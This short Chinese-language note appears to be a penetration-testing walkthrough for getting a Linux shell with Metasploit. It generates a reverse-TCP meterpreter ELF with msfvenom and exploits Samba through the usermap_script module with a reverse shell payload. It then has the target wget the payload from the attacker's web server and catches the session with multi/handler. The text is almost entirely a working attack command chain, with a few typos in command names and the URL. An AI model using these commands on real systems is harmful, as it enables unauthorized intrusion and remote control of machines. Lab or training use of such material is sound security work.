msf ：linux后台获取

#使用msf获得shell

  1. 生成木马：msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f elf -o payload.elf

  2. 获取shell

    ​ 1.打开msfconsole

    ​ 2.使用nmap扫描目标机开放端口 命令: namp -sV [ip]

    ​ 3.使用msf中的模块 命令: use multi/samba/usermap_script

    4.设置参数        命令: set payloads cmd/unix/reverse

    ​ 设置目标ip set rhosts id

    ​ 设置目标端口 set rport

    ​ 设置主机ip set lhost

    ​ 5.获取shell 命令：run或者exploit

    ​

    3.开启web服务，将木马下载之目标机中

    ​ 服务开启命令：python3 -m http.server

    ​ 在shell中下载 命令： wget http://id/8000/payload.elf

    4.使用msf监听听模块 命令: use exploit/mulit/handler

    ​ 设置payload 命令： set payload linux/x86/meterpreter/reverse_tcp

    ​ 设置攻击机ip 命令： set lhost ip

    ​ 运行 run -j

    5.运行木马 ./payload.elf

    ​ 发现权限不够

    ​ 更改木马权限 chmod +x payload.elf

    6.成功获取 meterpreter

    ​
